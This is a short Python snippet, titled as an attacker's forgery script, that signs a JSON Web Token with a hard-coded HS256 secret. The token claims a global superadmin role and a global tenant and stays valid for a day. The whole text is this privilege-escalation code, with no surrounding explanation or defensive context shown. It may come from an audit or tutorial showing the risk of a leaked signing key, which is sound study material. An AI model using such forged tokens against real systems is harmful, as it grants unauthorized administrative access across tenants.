# ATTACKER FORGERY SCRIPT
forged_token = jwt.encode(
    {
        "sub": "attacker-id",
        "roles": ["GLOBAL_SUPERADMIN"],
        "tenant_id": "GLOBAL_TENANT",
        "exp": int(time.time()) + 86400,
    },
    "super-secret-production-key-2024",
    algorithm="HS256",
)
